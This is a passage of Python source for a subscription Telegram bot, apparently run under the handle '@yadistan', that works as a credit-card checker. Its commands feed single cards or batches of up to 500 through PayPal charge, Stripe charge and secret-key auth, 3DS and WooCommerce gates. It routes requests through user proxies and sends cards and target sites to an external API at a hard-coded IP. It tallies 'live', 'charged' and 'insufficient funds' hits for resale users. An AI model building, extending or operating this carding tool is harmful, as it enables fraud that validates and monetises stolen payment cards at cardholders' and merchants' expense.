            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
            return

        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            if datetime.now() - provided_time > timedelta(hours=0):
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("YADISTAN", url="https://t.me/yadistan"))
                bot.send_message(message.chat.id,
                    '<b>𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>', reply_markup=kb, parse_mode='HTML')
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan']  = '𝗙𝗥𝗘𝗘'
                with _DATA_LOCK:
                    with open("data.json", 'w', encoding='utf-8') as f:
                        json.dump(json_data, f, indent=2)
                return
        except Exception:
            pass

        card = _get_card_from_message(message)
        if not card:
            bot.reply_to(message,
                "<b>Usage: /p 4111111111111111|12|25|123\n\n"
                "💡 Proxy set karo: /setproxy\n"
                "💡 Reply mein bhi card de sakte ho</b>",
                parse_mode='HTML')
            return

        # Get user's saved proxy string
        proxy_raw = get_user_proxy(id) or ""

        log_command(message, query_type='gateway', gateway='ppcharge')
        msg = bot.reply_to(message, "<b>⏳ PayPal Charge check ho raha hai...</b>", parse_mode='HTML')

        bin_num  = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)

        start_time = time.time()
        status, resp_msg = _ppcharge_call(card, proxy_raw)
        elapsed = time.time() - start_time

        log_card_check(id, card, 'ppcharge', f"{status} | {resp_msg}", exec_time=elapsed)

        if status == "CHARGED":
            emoji = "✅"
            label = "CHARGED"
            _add_to_merge(id, card)
        elif status == "DECLINED":
            emoji = "❌"
            label = "DECLINED"
        else:
            emoji = "⚠️"
            label = status

        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))

        proxy_display = proxy_raw[:30] + "..." if len(proxy_raw) > 30 else (proxy_raw or "None")
        out = UI.fmt_single(
            "p", card, emoji, f"{label} — {resp_msg}",
            gate_name="PayPal Charge API",
            bin_info=bin_info, bank=bank, country=country, country_code=country_code,
            elapsed=elapsed,
            extra_fields=[("Proxy", proxy_display)]
        )
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=out,
            reply_markup=kb,
            parse_mode='HTML',
            disable_web_page_preview=True
        )

    threading.Thread(target=my_function).start()
# ================== /p END ==================


# ================== /ppm — PayPal Mass Checker ==================
@bot.message_handler(commands=["ppm"])
def ppm_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message, "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/ppm card1\ncard2\ncard3\n\n<i>Max 50 cards at a time.</i></b>")
            return
        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 50 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(cards)
        user_amount = get_user_amount(id)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>💳 𝗣𝗮𝘆𝗣𝗮𝗹 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀 · 💰 ${user_amount}\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        approved = insuf = dead = checked = 0
        results_lines = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = (
                f"<b>✨ ✦ ─── P P   M A S S ─── ✦ ✨\n"
                f"╔══════════════════════════╗\n"
                f"║  💳  PAYPAL MASS CHECKER  ║\n"
                f"╚══════════════════════════╝\n"
                f"│ {status}\n"
                f"│\n"
                f"│ 💰 ${user_amount}  ·  📊 {checked}/{total}  ·  ✅ {approved}  ·  💰 {insuf}  ·  ❌ {dead}\n"
                f"│\n"
            )
            body = "\n".join(results_lines[-15:])
            return h + body + f"\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>"
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                except:
                    pass
                return
            cc = cc.strip()
            result = paypal_gate(cc, user_amount, proxy)
            checked += 1
            if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in result:
                status_emoji = "✅"; approved += 1
            elif "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀" in result:
                status_emoji = "💰"; insuf += 1
            else:
                status_emoji = "❌"; dead += 1
            log_card_check(id, cc, 'paypal_mass', result)
            results_lines.append(f"{status_emoji} <b>{result[:28]}</b>  ·  <code>{cc}</code>")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_msg(), parse_mode='HTML', reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), parse_mode='HTML', reply_markup=kb)
        except:
            pass
    threading.Thread(target=my_function).start()

# ================== Passed Command (/vbv) ==================
def _vbv_classify(result):
    """Classify passed_gate result → (emoji, label, is_hit, is_challenged)."""
    if "3DS Authenticate Attempt Successful" in result:
        return "✅", "PASSED", True, False
    if "3DS Challenge Required" in result:
        return "⚠️", "CHALLENGE", False, True
    return "❌", "DECLINED", False, False


@bot.message_handler(commands=["vbv", "vbvm"])
def passed_command(message):
    def my_function():
        uid = message.from_user.id
        json_data = _load_data()
        try:
            BL = json_data[str(uid)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        # Subscription timer check
        try:
            date_str = json_data[str(uid)]['timer'].split('.')[0]
            if datetime.now() - datetime.strptime(date_str, "%Y-%m-%d %H:%M") > timedelta(hours=0):
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton(text="YADISTAN", url="https://t.me/wan_ef"))
                bot.send_message(message.chat.id,
                    '<b>𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>', reply_markup=kb)
                json_data[str(uid)]['timer'] = 'none'
                json_data[str(uid)]['plan']  = '𝗙𝗥𝗘𝗘'
                with _DATA_LOCK:
                    with open("data.json", 'w', encoding='utf-8') as _fw:
                        json.dump(json_data, _fw, indent=2)
                return
        except Exception:
            pass

        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n"
                "/vbv 4111111111111111|12|25|123\n"
                "/vbv card1\ncard2\ncard3\n\n"
                "<i>💡 Single card → instant result | Multiple cards → mass check</i></b>",
                parse_mode='HTML')
            return

        proxy = get_proxy_dict(uid)
        log_command(message, query_type='gateway', gateway='vbv')

        # ══════════════════════════════════════════════════════════════════
        # SINGLE CARD MODE
        # ══════════════════════════════════════════════════════════════════
        if len(cards) == 1:
            allowed, wait = check_rate_limit(uid, BL)
            if not allowed:
                bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
                return
            card = cards[0]
            msg  = bot.reply_to(message, "<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘄𝗶𝘁𝗵 𝗩𝗕𝗩 𝗚𝗮𝘁𝗲𝘄𝗮𝘆... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $2.00</b>", parse_mode='HTML')
            bin_info, bank, country, country_code = get_bin_info(card[:6])
            t0 = time.time()
            result = passed_gate(card, proxy)
            elapsed = time.time() - t0
            log_card_check(uid, card, 'vbv', result, exec_time=elapsed)
            emoji, label, _, _ = _vbv_classify(result)
            if label == "PASSED":
                _top = "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
                _box = "╔══════════════════════════╗\n║  ✅  3DS AUTH — PASSED !  ║\n╚══════════════════════════╝"
            elif label == "CHALLENGE":
                _top = "⚠️ ─── 3 D S   C H A L L E N G E ─── ⚠️"
                _box = "╔══════════════════════════╗\n║  ⚠️  3DS CHALLENGE REQ    ║\n╚══════════════════════════╝"
            else:
                _top = "✨ ✦ ─── D E C L I N E D ─── ✦ ✨"
                _box = "╔══════════════════════════╗\n║  ❌  DECLINED             ║\n╚══════════════════════════╝"
            _cc_show = country_code if country_code not in ('N/A', '??', '', 'Unknown') else ''
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                reply_markup=kb, parse_mode='HTML',
                disable_web_page_preview=True,
                text=UI.fmt_single(
                    "vbv", card, emoji, result,
                    gate_name="3DS Auth Gateway",
                    bin_info=bin_info, bank=bank,
                    country=country, country_code=_cc_show,
                    elapsed=elapsed, amount="2.00"
                ))
            return

        # ══════════════════════════════════════════════════════════════════
        # MASS MODE  (concurrent — 5 workers)
        # ══════════════════════════════════════════════════════════════════
        total = len(cards)
        if total > 500:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 500 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>", parse_mode='HTML')
            return
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message,
            f"<b>🛡️ 𝗩𝗕𝗩 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>",
            reply_markup=stop_kb, parse_mode='HTML')
        live = 0; dead = 0; challenged = 0; checked = 0
        results_lines = []; approved_hits = []
        lock = threading.Lock()
        _live_hit_holder = [None, []]

        def build_vbv_mass_msg(status="⏳"):
            return UI.fmt_mass_progress(
                "vbv", checked, total, live, dead,
                gate_name="3DS Auth Gateway",
                secondary=challenged, secondary_emoji="⚠️", secondary_label="3DS Chall",
                results_lines=results_lines, status=status
            )

        def _vbv_check_one(cc):
            nonlocal live, dead, challenged, checked
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            result = passed_gate(cc, proxy)
            emoji, label, is_hit, is_chall = _vbv_classify(result)
            with lock:
                checked += 1
                if is_hit:    live += 1; approved_hits.append(cc); _add_to_merge(uid, cc)
                elif is_chall: challenged += 1
                else:          dead += 1
                results_lines.append(f"{emoji} <b>{label}</b>  ·  <code>{cc}</code>")
            if is_hit:
                _notify_live_hit(message.chat.id, cc, "vbvm", holder=_live_hit_holder)
            try:
                sk = types.InlineKeyboardMarkup()
                sk.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_vbv_mass_msg(), parse_mode='HTML', reply_markup=sk)
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(_vbv_check_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False); break
                try: fut.result()
                except Exception: pass

        stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_vbv_mass_msg("🛑" if stopped else "✅"),
                parse_mode='HTML', reply_markup=kb, disable_web_page_preview=True)
        except Exception:
            pass
        if approved_hits:
            try:
                hits_kb = types.InlineKeyboardMarkup(row_width=2)
                hits_kb.add(types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                            types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot"))
                bot.send_message(message.chat.id,
                    UI.fmt_mass_hits("vbv", approved_hits, total),
                    parse_mode='HTML', reply_markup=hits_kb, disable_web_page_preview=True)
            except Exception:
                pass

    threading.Thread(target=my_function).start()

# ================== OC Command (External API Checker) ==================
_OC_API = os.environ.get("OC_API_URL", "http://108.165.12.183:8081/")

@bot.message_handler(commands=["oc"])
def oc_command(message):
    def my_function():
        uid = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as _f:
            json_data = json.load(_f)
        try:
            BL = json_data[str(uid)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return
        allowed, wait = check_rate_limit(uid, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
            return
        try:
            date_str = json_data[str(uid)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            if datetime.now() - provided_time > timedelta(hours=0):
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("YADISTAN", url="https://t.me/yadistan"))
                bot.send_message(message.chat.id, '<b>𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>',
                                  reply_markup=kb, parse_mode='HTML')
                json_data[str(uid)]['timer'] = 'none'
                json_data[str(uid)]['plan'] = '𝗙𝗥𝗘𝗘'
                with _DATA_LOCK:
                    with open("data.json", 'w', encoding='utf-8') as _fw:
                        json.dump(json_data, _fw, indent=2)
                return
        except Exception:
            pass

        _usage = (
            "<b>╔══════════════════════════════╗\n"
            "║   🌐  O C   C H E C K E R   ║\n"
            "╚══════════════════════════════╝\n\n"
            "📌 Usage:\n"
            "<code>/oc https://site.com 4111111111111111|12|26|123</code>\n\n"
            "▸ Multiline:\n"
            "<code>/oc https://site.com\n4111111111111111|12|26|123</code>\n\n"
            "▸ With proxy (host:port:user:pass):\n"
            "<code>/oc https://site.com 4111111111111111|12|26|123 proxy.host:8080:user:pass</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⌤ Dev by @yadistan</b>"
        )

        _CARD_RE = re.compile(r'\d{13,19}[|/ ]\d{1,2}[|/ ]\d{2,4}[|/ ]\d{3,4}')
        raw = (message.text or '').strip()
        lines = raw.split('\n')
        first_line_parts = lines[0].split(None, 3)  # /oc <site> [card] [proxy]

        card = url_oc = proxy_oc = None

        # Extract URL from first line (arg after /oc)
        if len(first_line_parts) >= 2:
            url_oc = first_line_parts[1].strip()

        # Card: check rest of first line or next lines
        remaining_first = first_line_parts[2].strip() if len(first_line_parts) >= 3 else ''
        proxy_raw_arg   = first_line_parts[3].strip() if len(first_line_parts) >= 4 else ''

        # Card from same line (after site)
        _cm = _CARD_RE.search(remaining_first)
        if _cm:
            card = _cm.group().replace(' ', '|')
            # proxy might follow after card in remaining_first
            if not proxy_raw_arg:
                after_card = remaining_first[_cm.end():].strip()
                if after_card:
                    proxy_raw_arg = after_card
        else:
            # Card might be on next line(s)
            for ln in lines[1:]:
                ln = ln.strip()
                _cm2 = _CARD_RE.search(ln)
                if _cm2:
                    card = _cm2.group().replace(' ', '|')
                    break

        # Proxy arg
        proxy_oc = proxy_raw_arg if proxy_raw_arg else None

        # Fallback: card from reply
        if not card and message.reply_to_message:
            _rt = message.reply_to_message.text or message.reply_to_message.caption or ''
            _cr = _CARD_RE.search(_rt)
            if _cr:
                card = _cr.group().replace(' ', '|')

        if not url_oc or not url_oc.startswith('http'):
            bot.reply_to(message, _usage, parse_mode='HTML')
            return
        if not card or len(card.split('|')) < 4:
            bot.reply_to(message, _usage, parse_mode='HTML')
            return

        if not proxy_oc:
            proxy_oc = get_user_proxy(uid) or ""

        log_command(message, query_type='gateway', gateway='oc')
        msg = bot.reply_to(message,
            f"<b>⏳ Checking via OC gateway...\n"
            f"💳 Card: <code>{card}</code>\n"
            f"🌐 Site: {url_oc[:50]}</b>", parse_mode='HTML')

        bin_num = card.split('|')[0][:6]
        bin_info, bank, country, cc_flag = get_bin_info(bin_num)

        try:
            params = {'cc': card, 'url': url_oc}
            if proxy_oc:
                params['proxy'] = proxy_oc
            start_t = time.time()
            resp = requests.get(_OC_API, params=params, timeout=60)
            elapsed = time.time() - start_t
            data = resp.json()
        except requests.exceptions.Timeout:
            bot.edit_message_text("<b>❌ API Timeout — server did not respond in 60s.</b>",
                                  message.chat.id, msg.message_id, parse_mode='HTML')
            return
        except Exception as e:
            bot.edit_message_text(f"<b>❌ API Error: {str(e)[:80]}</b>",
                                  message.chat.id, msg.message_id, parse_mode='HTML')
            return

        response_txt = str(data.get('Response', '')).strip()
        gate_txt     = str(data.get('Gate', 'Unknown')).strip()
        price_txt    = str(data.get('Price', '0.00')).strip()
        resp_l       = response_txt.lower()

        if any(k in resp_l for k in ('approved', 'success', 'charged', 'charge !!')):
            emoji = "✅"
            top   = "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
            box   = "╔══════════════════════════╗\n║  ✅  A P P R O V E D  !  ║\n╚══════════════════════════╝"
        elif any(k in resp_l for k in ('otp', '3d', '3ds', 'authenticate', 'challenge')):
            emoji = "⚠️"
            top   = "⚠️ ─── O T P / 3 D S ─── ⚠️"
            box   = "╔══════════════════════════╗\n║  ⚠️  3DS / OTP REQ        ║\n╚══════════════════════════╝"
        elif any(k in resp_l for k in ('insufficient', 'funds')):
            emoji = "💰"
            top   = "💰 ─── I N S U F F I C I E N T ─── 💰"
            box   = "╔══════════════════════════╗\n║  💰  INSUFFICIENT FUNDS  ║\n╚══════════════════════════╝"
        else:
            emoji = "❌"
            top   = "✨ ✦ ─── D E C L I N E D ─── ✦ ✨"
            box   = "╔══════════════════════════╗\n║  ❌  D E C L I N E D      ║\n╚══════════════════════════╝"

        _bank_d = bank if bank not in ('Unknown', '') else '—'
        _bin_d  = bin_info if bin_info not in ('Unknown', 'Unknown - ', '') else '—'
        _cc_d   = cc_flag if cc_flag not in ('N/A', '??', '', 'Unknown') else ''

        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))

        bot.edit_message_text(
            f"<b>{top}\n"
            f"{box}\n"
            f"│\n"
            f"│ {emoji} {response_txt}\n"
            f"│ 💳 <code>{card}</code>\n"
            f"│ 💵 Amount: ${price_txt}\n"
            f"│\n"
            f"│ 🏦 BIN: {_bin_d}\n"
            f"│ 🏛️ Bank: {_bank_d}\n"
            f"│ 🌍 Country: {country} {_cc_d}\n"
            f"│\n"
            f"│ 🌐 Site: {url_oc[:45]}\n"
            f"│ 🏷️ Gate: {gate_txt[:40]}\n"
            f"│ ⏱️ {elapsed:.2f}s\n"
            f"└──────────────────────────\n"
            f"       ⌤ Bot by @yadistan</b>",
            message.chat.id, msg.message_id,
            parse_mode='HTML', reply_markup=kb
        )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe Charge Command ==================
def _st_classify(result):
    """Classify stripe_charge / stripe_sk result → (emoji, is_hit, is_insuf)."""
    if any(x in result for x in ("Charge !!", "Approved", "Auth", "Charged", "Successful")):
        if "Insufficient" in result:
            return "💰", False, True
        return "✅", True, False
    if "Insufficient" in result:
        return "💰", False, True
    if "3DS" in result or "OTP" in result or "Requires" in result:
        return "⚠️", False, False
    if "Error" in result or "failed" in result.lower():
        return "⚠️", False, False
    return "❌", False, False


@bot.message_handler(commands=["st", "stm"])
def stripe_charge_command(message):
    def my_function():
        uid = message.from_user.id
        json_data = _load_data()
        try:
            BL = json_data[str(uid)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n"
                "/st 4111111111111111|12|25|123\n"
                "/st card1\ncard2\ncard3\n\n"
                "<i>💡 Single card → instant result | Multiple cards → mass check</i></b>",
                parse_mode='HTML')
            return

        proxy    = get_proxy_dict(uid)
        user_sk  = get_user_sk(uid)
        log_command(message, query_type='gateway', gateway='stripe_charge')

        # ══════════════════════════════════════════════════════════════════
        # SINGLE CARD MODE
        # ══════════════════════════════════════════════════════════════════
        if len(cards) == 1:
            allowed, wait = check_rate_limit(uid, BL)
            if not allowed:
                bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
                return
            card = cards[0]
            if user_sk:
                sk_masked = f"{user_sk[:12]}...***"
                msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘄𝗶𝘁𝗵 𝗦𝗞 𝗞𝗲𝘆... ⏳\n🔑 𝗞𝗲𝘆: <code>{sk_masked}</code></b>", parse_mode='HTML')
            else:
                msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $1.00</b>", parse_mode='HTML')
            bin_info, bank, country, country_code = get_bin_info(card[:6])
            t0 = time.time()
            if user_sk:
                result = stripe_sk_check(card, user_sk, proxy)
                gw_label = "stripe_sk"; header_label = "#SK_Auth 🔑"; amount_label = "$0.01 Auth"
            else:
                result = stripe_charge(card, proxy)
                gw_label = "stripe_charge"; header_label = "#stripe_charge $1.00 🔥"; amount_label = "$1.00"
            elapsed = time.time() - t0
            log_card_check(uid, card, gw_label, result, exec_time=elapsed)
            emoji, _, _ = _st_classify(result)
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            _st_gate = "Stripe SK Auth" if user_sk else "Stripe Charge API"
            _st_amt  = None if user_sk else amount_label
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                parse_mode='HTML', reply_markup=kb,
                disable_web_page_preview=True,
                text=UI.fmt_single(
                    "st", card, emoji, result,
                    gate_name=_st_gate,
                    bin_info=bin_info, bank=bank,
                    country=country, country_code=country_code,
                    elapsed=elapsed, amount=_st_amt
                ))
            return

        # ══════════════════════════════════════════════════════════════════
        # MASS MODE  (concurrent — 5 workers)
        # ══════════════════════════════════════════════════════════════════
        total = len(cards)
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        _st_gate_name = "Stripe SK Auth" if user_sk else "Stripe Charge"
        msg = bot.reply_to(message,
            UI.fmt_mass_header("st", total, gate_name=_st_gate_name),
            reply_markup=stop_kb, parse_mode='HTML')
        live = 0; dead = 0; insufficient = 0; checked = 0
        results_lines = []
        lock = threading.Lock()

        def build_st_mass_msg(st="⏳"):
            _sg = "Stripe SK Auth" if user_sk else "Stripe Charge"
            return UI.fmt_mass_progress(
                "st", checked, total, live, dead,
                gate_name=_sg, secondary=insufficient,
                secondary_emoji="💰", secondary_label="Insuf",
                results_lines=results_lines, status=st
            )

        def _st_check_one(cc):
            nonlocal live, dead, insufficient, checked
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            t0 = time.time()
            if user_sk:
                result = stripe_sk_check(cc, user_sk, proxy)
            else:
                result = stripe_charge(cc, proxy)
            elapsed = time.time() - t0
            log_card_check(uid, cc, 'stripe_mass', result, exec_time=elapsed)
            emoji, is_live, is_insuf = _st_classify(result)
            with lock:
                checked += 1
                if is_live:   live += 1
                elif is_insuf: insufficient += 1
                else:          dead += 1
                results_lines.append(f"{emoji} <code>{cc}</code>\n   ↳ {result}")
            try:
                sk = types.InlineKeyboardMarkup()
                sk.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_st_mass_msg(), reply_markup=sk, parse_mode='HTML')
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(_st_check_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False); break
                try: fut.result()
                except Exception: pass

        stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
        try:
            done_kb = types.InlineKeyboardMarkup()
            done_kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_st_mass_msg("🛑" if stopped else "✅"),
                reply_markup=done_kb, parse_mode='HTML', disable_web_page_preview=True)
        except Exception:
            pass

    threading.Thread(target=my_function).start()

# ================== /dlx — DLX WooCommerce Stripe Auth ==================
@bot.message_handler(commands=['dlx', 'dlxm'])
def dlx_command(message):
    def my_function():
        uid  = message.from_user.id
        BL, _expired = get_user_plan(uid)
        if _expired:
            bot.reply_to(message, UI.fmt_expired(), parse_mode='HTML')
            return
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message,
                '<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>',
                parse_mode='HTML')
            return

        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                '<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n'
                '/dlx 4111111111111111|12|25|123\n'
                '/dlx card1\ncard2\ncard3\n\n'
